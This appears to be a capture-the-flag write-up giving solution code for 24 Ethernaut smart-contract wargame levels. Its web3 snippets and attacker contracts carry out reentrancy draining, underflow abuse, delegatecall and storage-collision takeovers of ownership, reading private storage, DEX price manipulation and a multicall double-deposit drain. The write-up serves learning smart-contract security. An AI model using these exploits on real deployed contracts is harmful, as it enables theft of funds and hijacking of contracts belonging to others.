# Ethernaut - Solutions

## 1. Fallback

```
await contract.contribute({ value: toWei("0.0001") });
await contract.sendTransaction({ value: toWei("0.0001") });
await contract.withdraw();
```


## 2. Fallout

```
await contract.Fal1out({ value: toWei("0.0001") });
await contract.collectAllocations();
```


## 3. Coin Flip

Compile [CoinFlipAttack.sol](./solutions/CoinFlipAttack.sol) and deploy it to the Rinkeby testnet with e.g. Remix IDE and MetaMask (Injected Web3).
Do not forget to specify the level `instance` address when deploying the attacker contract (constructor).  
Afterwards, just call the `callFlipWithCorrectGuess()` function 10 times.


## 4. Telephone

Compile [TelephoneProxy.sol](./solutions/TelephoneProxy.sol) and deploy it to the Rinkeby testnet with e.g. Remix IDE and MetaMask (Injected Web3).
Afterwards, just call the `giveMeTelephoneOwnership(address _telephoneContract)` function with the level `instance` address as first argument.

## 5. Token

```
const balance = Number(await contract.balanceOf(player));
await contract.transfer(level /* can be any address except own */, balance + 1 /* create underflow in contract */);
```

## 6. Delegation

See solidity function [delegatecall](https://solidity-by-example.org/delegatecall/).
```
await contract.sendTransaction({ data: web3.eth.abi.encodeFunctionSignature("pwn()") });
```

## 7. Force

See solidity function [selfdestruct](https://solidity-by-example.org/hacks/self-destruct/).  
Compile [ForcePay.sol](./solutions/ForcePay.sol) and deploy it to the Rinkeby testnet with at least 0.001 ETH.
Afterwards, just call the `destroyAndLeaveBalanceAt(address _contract)` function with the level `instance` address as first argument.

## 8. Vault

```
const password = await web3.eth.getStorageAt(instance, 1); // get storage variable at index 1 of contract (although it's private!)
await contract.unlock(password);
```

## 9. King

Compile [King4Ever.sol](./solutions/King4Ever.sol) and deploy it to the Rinkeby testnet with at least 0.001 ETH and the level `instance` address as argument (constructor).
The fallback function of this contract is going to revert any subsequent transaction which is trying to claim the throne.

## 10. Re-entrancy

Compile [ReentranceAttack.sol](./solutions/ReentranceAttack.sol) and deploy it to the Rinkeby testnet with e.g. 0.0001 ETH and the level `instance` address as argument (constructor).
Afterwards, just call the `drainVictim()` function to steal all funds from the level contract. Once this is done, do not forget to call the `withdraw()` function to get the funds back to your wallet.

## 11. Elevator

Compile [Building.sol](./solutions/Building.sol) and deploy it to the Rinkeby testnet with e.g. Remix IDE and MetaMask (Injected Web3).
Afterwards, just call the `goToTop(address _elevatorContract)` function with the level `instance` address as first argument.

## 12. Privacy

See [Layout of State Variables in Storage](https://docs.soliditylang.org/en/v0.6.12/internals/layout_in_storage.html).
```
const data2_32 = await web3.eth.getStorageAt(instance, 5); // get private storage variable 'data[2]' from contract
const data2_16 = data2_32.substring(0, data2_32.length - 32); // remove last 16 bytes from data[2], i.e. typecast from bytes32 to bytes16
await contract.unlock(data2_16);
```

## 13. Gatekeeper One

See [Solidity - Conversions](https://www.tutorialspoint.com/solidity/solidity_conversions.htm).  
Compile [GatebreakerOne.sol](./solutions/GatebreakerOne.sol) and deploy it to the Rinkeby testnet with the level `instance` address as argument (constructor). Done!

## 14. Gatekeeper Two

See [Bypass Contract Size Check](https://solidity-by-example.org/hacks/contract-size/).  
Compile [GatebreakerTwo.sol](./solutions/GatebreakerTwo.sol) and deploy it to the Rinkeby testnet with the level `instance` address as argument (constructor). Done!


## 15. Naught Coin

Circumvent the token lock using (non-overrided) ERC20 base class functions:
```
const playerBalance = await contract.balanceOf(player);
await contract.approve(player, playerBalance); // approve self to transfer tokens using 'transferFrom' function

const tokenReceiver = web3.eth.accounts.create(); // create new account to receive tokens
await contract.transferFrom(player, tokenReceiver.address, playerBalance); // transfer tokens to new account
```

## 16. Preservation

See solidity function [delegatecall](https://solidity-by-example.org/delegatecall/).  
Compile [MadLibraryContract.sol](./solutions/MadLibraryContract.sol) and deploy it to the Rinkeby testnet with e.g. Remix IDE and MetaMask (Injected Web3).
Afterwards, just call the `attack1(address _preservationContract)` and `attack2(address _preservationContract)` functions with the level `instance` address as first argument.
Note that the attack needed to be split into two distinct transactions due to [cached storage reads](https://github.com/ethereum/solidity/issues/3118) in Solidity.


## 17. Recovery

Contract addresses in the EVM (Ethereum Virtual Machine) are deterministic, see [How is the Ethereum contract address calculated?](https://netfreeman.com/2022/02/202202032047017508.html).  
Furthermore, it is crucial to understand RLP (Recursive Length Prefix) coding, see [RLP | Ethereum Wiki](https://eth.wiki/fundamentals/rlp) and [Online RLP en-/decoder](https://toolkit.abdk.consulting/ethereum#rlp).  
Assuming call to function `generateToken(string memory _name, uint256 _initialSupply)` was the first transaction of the freshly deployed `Recovery` contract: `nonce = 1`.
```
/*
const tempHash = web3.utils.soliditySha3(RLP([ instance, nonce ])); // nonce = 1
 --> RLP(nonce) = RLP(1) = "0x01"
 --> RLP(instance) = 0x80 + bytelen(instance), instance = 0x80 + 20, instance = "0x94", instance
 -> ... := "0x94", instance, "0x01"
 -> RLP([ instance, nonce ]) = RLP("0x94", instance, "0x01") = 0xC0 + bytelen(...), ... = 0xC0 + 22, ... = "0xD6", ...
*/
const tempHash = web3.utils.soliditySha3("0xD6", "0x94", instance, "0x01");
const contractAddress = "0x" + tempHash.slice(26); // slice '0x' and first 12 bytes -> address of lost 'SimpleToken' contract


// Call 'destroy(address payable _to)' function of 'SimpleToken' contract to recover funds.
const destroySig = web3.eth.abi.encodeFunctionSignature("destroy(address)"); // 'address payable' is just 'address' in ABI
const destroyParam = web3.eth.abi.encodeParameter("address", player);
const destroyData = destroySig + destroyParam.slice(2); // slice '0x' before concatenating hex strings
await web3.eth.sendTransaction({ from: player, to: contractAddress, data: destroyData });
```

## 18. MagicNumber

See [How to deploy contracts using raw assembly opcodes](https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2) for an in-depth walk-through.

Contract bytecode / opcodes (see [Ethereum Virtual Machine Opcodes](https://www.ethervm.io/)):
```
// --- INITIALIZATION / CONTACT CREATION CODE ---
// codecopy(t=0x00, f=0x0C, s=0x0A) ... copy runtime code to memory
60 0A   // push1 0x0A (size of runtime code)
60 0C   // push1 0x0C (offset of runtime code = size of init code)
60 00   // push1 0x00 (destination memory location)
39      // codecopy

// return(p=0x00, s=0x0A) ... return data at memory location 0x00 with size 0x0A bytes
                              [return runtime code to EVM]
60 0A   // push1 0x0A
60 00   // push1 0x00
F3      // return


// --- RUNTIME CODE ---
// mstore(p=0x00, v=0x2A) ... store byte 0x2A (42) at memory location 0x00
60 2A   // push1 0x2A
60 00   // push1 0x00
52      // mstore

// return(p=0x00, s=0x20) ... return data at memory location 0x00 with size 0x20 (32) bytes
                              [return uint256(42) to caller]
60 20   // push1 0x20
60 00   // push1 0x00
F3      // return
```

Web3 code:
```
const contractBytes = "0x600A600C600039600A6000F3602A60005260206000F3";
const solverContract = await web3.eth.sendTransaction({ from: player, data: contractBytes });
await contract.setSolver(solverContract.contractAddress);
```


## 19. Alien Codex

See [Collisions of Solidity Storage Layouts](https://mixbytes.io/blog/collisions-solidity-storage-layouts).
```
await contract.make_contact();
await contract.retract(); // use underflow to make all 2^256 storage slots accessible via 'codex' array

/* Storage slot layout:
    0: owner (address), contact (bool)
    1: codex.length (uint256)
    .
    .
    .
    keccak256(1): codex[0] (bytes32)
    .
    keccak256(1)+i: codex[i] (bytes32)
*/
const uint256_range = web3.utils.toBN(2).pow(web3.utils.toBN(256)); // 2^256
const codex_offset = web3.utils.toBN(web3.utils.soliditySha3(1)); // 1 is the storage slot of 'codex[]'
const storage0_relative_to_codex = uint256_range.sub(codex_offset); // compute index of storage slot 0 relative to 'codex[]'
const storage0_new_content = "0x000000000000000000000001" + player.slice(2); // build 32 bytes hex string with player address and 'contact = true'

await contract.revise(storage0_relative_to_codex, storage0_new_content); // replace contract owner with player
```

## 20. Denial

See [Difference between require and assert and the difference between revert and throw](https://ethereum.stackexchange.com/questions/15166/difference-between-require-and-assert-and-the-difference-between-revert-and-thro).  
Compile [Deny.sol](./solutions/Deny.sol) and deploy it to the Rinkeby testnet with the level `instance` address as argument (constructor). Done!


## 21. Shop

Compile [Buyer.sol](./solutions/Buyer.sol) and deploy it to the Rinkeby testnet with e.g. Remix IDE and MetaMask (Injected Web3).
Afterwards, just call the `buy(address _shopContract)` function with the level `instance` address as first argument.


## 22. Dex

Take a close look at this function of the `Dex` contract while considering how the `approve` function of an `ERC20` contract works:
```
function approve(address spender, uint amount) public {
  SwappableToken(token1).approve(spender, amount);
  SwappableToken(token2).approve(spender, amount);
}
```
The `approve` function of an `ERC20` contract allows the `spender` to transfer `amount` of tokens from the `msg.sender`.
In this case the `msg.sender` is the `Dex` contract, therefore we can easily drain the tokens from the contract by calling the `transferFrom` function of the token `ERC20` contracts.  
Example for 'Token 1':
```
await contract.approve(player, 100);
const addressToken1 = await contract.token1();

const transferSig = web3.eth.abi.encodeFunctionSignature("transferFrom(address,address,uint256)");
const transferParams = web3.eth.abi.encodeParameters(["address", "address", "uint256"], [contract.address, player, 100]);
const transferData = transferSig + transferParams.slice(2);

await web3.eth.sendTransaction({ from: player, to: addressToken1, data: transferData });
```
This works as expected if the challenge is deployed on a local testnet. However, it does not work with the actual level which is currently (as of 2022-02-12) deployed on the Rinkeby testnet.
I observed in the tokens' `Approve` events that the `msg.sender` is not the address of the `Dex` contract but the `player` address. This means that the level is not using the same code which is shown to us.
Probably the underlying `ERC20` contract code was locally modified to use `tx.origin` instead of `msg.sender`, but this is just a wild guess.


However, we can still solve the level by beating the price logic of the smart contract:
```
await contract.approve(instance, 110); // approve contract to spend max. amout of tokens player could possibly have
const addressToken1 = await contract.token1();
const addressToken2 = await contract.token2();

// just swap tokens back and forth
await contract.swap(addressToken1, addressToken2, await contract.balanceOf(addressToken1, player));
await contract.swap(addressToken2, addressToken1, await contract.balanceOf(addressToken2, player));
// --> player has 24 of 'Token 1'

// just swap tokens back and forth, again
await contract.swap(addressToken1, addressToken2, await contract.balanceOf(addressToken1, player));
await contract.swap(addressToken2, addressToken1, await contract.balanceOf(addressToken2, player));
// --> player has 41 of 'Token 1'

// we are getting closer ...
await contract.swap(addressToken1, addressToken2, await contract.balanceOf(addressToken1, player));
// --> player has 65 of 'Token 2', and Dex has 110 of 'Token 1' and 45 of 'Token 2'
await contract.swap(addressToken2, addressToken1, await contract.balanceOf(addressToken2, instance));
// --> player has 110 of 'Token 1' and 20 of 'Token 2', and Dex has 0!!! of 'Token 1' and 90 of 'Token 2'
// DONE!
```


## 23. Dex Two

This challenge has the same `approve` function we can exploit as the `Dex` contract of the previous challenge.
However, we can also beat this level by creating an own malicious `ERC20` token an trade it on `DexTwo`.

Compile [SwappableTokenThree.sol](./solutions/SwappableTokenThree.sol) and deploy it to the Rinkeby testnet with e.g. Remix IDE and MetaMask (Injected Web3).
Do not forget to specify the level `instance` address when deploying the token contract (constructor).  
Afterwards, just call the `drainDex()` function of our malicious token.


## 24. Puzzle Wallet

```
// become owner of PuzzeWallet, because storage slot overlaps with pendingAdmin of PuzzleProxy
const proposeSig = web3.eth.abi.encodeFunctionSignature("proposeNewAdmin(address)");
const proposeParam = web3.eth.abi.encodeParameter("address", player);
const proposeData = proposeSig + proposeParam.slice(2);
await web3.eth.sendTransaction({ from: player, to: contract.address, data: proposeData });

// whitelist player because player = owner already
await contract.addToWhitelist(player);

// build call "multicall([ deposit(), multicall([ deposit() ]) ])" to deposit msg.value twice
const depositSig = web3.eth.abi.encodeFunctionSignature("deposit()");
const multicallSig = web3.eth.abi.encodeFunctionSignature("multicall(bytes[])");
const innerMulticallParam = web3.eth.abi.encodeParameter("bytes[]", [ depositSig ]);
const innerMulticallData = multicallSig + innerMulticallParam.slice(2);
const outerMulticallParam = web3.eth.abi.encodeParameter("bytes[]", [ depositSig, innerMulticallData ]);
const outerMulticallData = multicallSig + outerMulticallParam.slice(2);

// deposit contract balance "twice"
const contractBalance = await web3.eth.getBalance(contract.address);
await web3.eth.sendTransaction({ from: player, to: contract.address, data: outerMulticallData, value: contractBalance });

// drain contract
await contract.execute(player, 2*contractBalance, []);

// become admin of PuzzleProxy, because storage slot overlaps with maxBalance of PuzzeWallet
await contract.setMaxBalance(player);
```